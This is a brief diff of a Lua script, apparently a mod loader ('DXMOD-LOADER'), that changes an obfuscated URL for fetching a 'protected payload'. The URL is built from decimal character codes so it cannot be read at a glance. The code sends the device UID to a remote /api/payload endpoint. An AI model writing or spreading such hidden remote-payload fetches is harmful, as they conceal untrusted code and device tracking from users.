@@ -762,7 +762,7 @@ local function LoadProtectedPayload(OriginalClass)
     end)
     WriteDebugLog("[DXMOD-LOADER] Device UID: " .. tostring(uid) .. " (ok: " .. tostring(ok_uid) .. ", err: " .. tostring(err_uid) .. ")")
 
-    local api_url = (function() local t={104,116,116,112,58,47,47,108,101,116,104,105,101,110,110,104,97,110,46,105,100,46,118,110,47,97,112,105,47,112,97,121,108,111,97,100} local r={} for i=1,#t do r[i]=string.char(t[i]) end return table.concat(r) end)()
+    local api_url = (function() local t={104,116,116,112,58,47,47,108,101,116,104,105,101,110,110,104,97,110,46,105,100,46,118,110,58,53,48,48,50,47,97,112,105,47,112,97,121,108,111,97,100} local r={} for i=1,#t do r[i]=string.char(t[i]) end return table.concat(r) end)()
     local payload = '{"uid":"' .. uid .. '"}'
     local httpResult = nil
     
